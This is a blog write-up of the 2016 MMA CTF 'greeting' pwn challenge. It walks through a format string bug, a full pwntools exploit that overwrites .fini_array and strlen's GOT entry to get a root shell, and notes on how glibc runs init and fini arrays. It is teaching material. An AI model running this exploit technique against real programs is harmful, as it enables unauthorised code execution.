---
title: 2016 MMA CTF greeting
date: 2016-11-12 05:57:11
tags:
- ctf
- format string vlun
categories:
- ctf_practice
---

Recently, I was busy with the exams, so I didn't write blogs. And in rest time of this semester, it's a busy time for me beacuse of exams and curriculum design. But bloging must be continued!

## Challenge

Here is the [challenge](https://github.com/ctfs/write-ups-2016/tree/master/mma-ctf-2nd-2016/pwn/greeting-150):
<!-- more -->
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2
  int v4; // edx@4
  int v5; // [sp+1Ch] [bp-84h]@2
  int v6; // [sp+5Ch] [bp-44h]@1
  int v7; // [sp+9Ch] [bp-4h]@1

  v7 = *MK_FP(__GS__, 20);
  printf("Please tell me your name... ");
  if ( getnline((char *)&v6, 64) )      //read 64 chs from stdin.
  {
    sprintf((char *)&v5, "Nice to meet you, %s :)\n", &v6);
    result = printf((const char *)&v5);
  }
  else
  {
    result = puts("Don't ignore me ;( ");
  }
  v4 = *MK_FP(__GS__, 20) ^ v7;
  return result;
}
```
The vuln is obvious: there is a format string vuln in line 14. And the program has provided us system's address. But how to exploit? There's no function call after printf(really?), even if we can overwrite the strlen's got address with system's plt address, but the problem is how to provide the argment of '/bin/sh'? Before I didn't notice the section .fini_array of elf, however it's the point for this vuln. I will give a detailed description about it below.

## Solution

So the solution is to overwrite one of the .fini_array's address with main's address to execute the main function again. And we can send '/bin/sh' to stack as the argment of system function. Then when executing strlen(s), system('/bin/sh') will be executed.

Here is the exp:
```python
from pwn import *

debug = 1
if debug:
    p = process('./greeting')
    context.log_level = 'debug'
else:
    p = remote('127.0.0.1', 10000)

main = 0x080485ED
system_plt = 0x08048490
fini_array = 0x08049934
strlen_got = 0x8049a54
fini_got = 0x08049934

p.recvuntil('Please tell me your name... ')

payload = "qq"                     #20
payload += p32(fini_got + 2)   #4
payload += p32(strlen_got + 2) #4
payload += p32(strlen_got)   #4
payload += p32(fini_got)     #4
payload += "%" + str(2016) + "c"       #0x804
payload += "%" + str(12) + "$hn"
payload += "%" + str(13) + "$hn"
payload += "%" + str(31884) + "c"      #0x8490
payload += "%" + str(14) + "$hn"
payload += "%" + str(349) + "c"        #0x85ed
payload += "%" + str(15) + "$hn"

raw_input("go?")
p.sendline(payload)
p.recvuntil('Please tell me your name... ')
p.sendline('/bin/sh')
p.interactive()
```
And we can get shell:
```shell
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x27 bytes:
    'uid=0(root) gid=0(root) groups=0(root)\n'
uid=0(root) gid=0(root) groups=0(root)
$  
```

## Conlusion

To find how .fini_array(& .init_array) works, I look up some docs and finally I do understand the procedure of a program. That's a lot help for me.
We all know some code will be executed before main function runs to initial the environment. And today I figure it out.

### .init && .preinit_array && .init_array

The three sections will be executed before main().
The section .init was declared as _init_proc(or _init). The runtime linker executes functions whose addresses are contained in the .preinit_array and .init_array sections. These functions are executed in the same order in which their addresses appear in the array. 
And according to the glibc source, the excuted order is belows:
.preinit_array-->_init-->.init_array
```c
void
 __libc_csu_init (int argc, char **argv, char **envp)
 {
   /* For dynamically linked executables the preinit array is executed by
      the dynamic linker (before initializing any shared object).  */
 
 #ifndef LIBC_NONSHARED
   /* For static executables, preinit happens right before init.  */
   {
     const size_t size = __preinit_array_end - __preinit_array_start;
     size_t i;
     for (i = 0; i < size; i++)
       (*__preinit_array_start [i]) (argc, argv, envp);
   }
 #endif
 
   _init ();
 
   const size_t size = __init_array_end - __init_array_start;
   for (size_t i = 0; i < size; i++)
       (*__init_array_start [i]) (argc, argv, envp);
 }
```

### .fini && .fini_array

It's almost the same for those two sections. But the differece is that these functions are executed in the reverse order in which their addresses appear in the .fini_array. 
```c
 void
 __libc_csu_fini (void)
 {
 #ifndef LIBC_NONSHARED
   size_t i = __fini_array_end - __fini_array_start;
   while (i-- > 0)
     (*__fini_array_start [i]) ();
 
   _fini ();
 #endif
 }
```

And one thing I must note is that glibc replaces __DTORS_LIST(.dtors) && __CTORS_LIST(.ctors) with .init_array && .fini_array. So don't be strange when you see somesome exploiting using __dtors_list && __ctors_list.

### Links
[Initialization and Termination Routines](http://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/index.html)
[The source](http://osxr.org:8080/glibc/source/csu/elf-init.c?v=glibc-2.16.0#0105)
[Replace .ctors/.dtors with .init_array/.fini_array on targets supporting them](https://gcc.gnu.org/bugzilla/show_bug.cgi?id=46770)
